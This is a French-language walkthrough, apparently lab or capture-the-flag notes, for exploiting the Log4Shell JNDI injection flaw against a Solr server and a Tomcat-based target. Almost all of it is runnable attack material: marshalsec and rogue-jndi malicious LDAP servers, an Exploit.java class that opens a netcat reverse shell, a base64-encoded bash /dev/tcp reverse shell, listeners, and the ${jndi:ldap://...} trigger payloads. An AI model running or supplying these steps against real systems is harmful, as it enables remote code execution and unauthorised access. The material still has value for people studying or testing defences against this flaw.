## Exploitation 1

```sh
sudo apt install maven -y
git clone  https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
```

1. Démarrer un serveur de référence LDAP 

```sh
./jdk1.8.0_181/bin/java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER.IP.ADDRESS:8000/#Exploit"
```

2. Créez et déplacez-vous vers un nouveau répertoire dans lequel vous pouvez héberger cette charge utile avec le  nom spécifique `Exploit.java`

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9001");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

3. Compilez votre charge utile :

```sh
./jdk1.8.0_181/bin/javac Exploit.java
#./jdk1.8.0_181/bin/javac Exploit.java -source 8 -target 8
```

4. Une fois votre charge utile créée et compilée, vDémarrer un serveur HTTP secondaire

```sh
python3 -m http.server 8000
```

5. Dematrrer un ecouteur

```sh
nc -nlvp 9001
```

5. Déclencher l'exploit et lancer notre syntaxe JNDI 

```sh
curl 'http://10.10.54.189:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER.IP.ADDRESS:1389/Exploit\}'
```


## Exploitation 2

```sh
git clone https://github.com/veracode-research/rogue-jndi 
cd rogue-jndi 
mvn package
```

1. Generer un payloads pour obtenir une RCE:

```sh
echo 'bash -c bash -i >&/dev/tcp/10.10.14.150/9001 0>&1' | base64
```

2. Demarrer un serveur LDAP malveillant pour les attaques par injection JNDI. 

```sh
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64_STRING_HERE}|
{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```

Prendre celui du serveur `tomcat`

3. Demarrer un ecouteur 

```sh
rlwrap nc  -nlvp 9001
```

4. Envoyer le payload du serveur tomcat dans le champ vulnerable

```
${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
```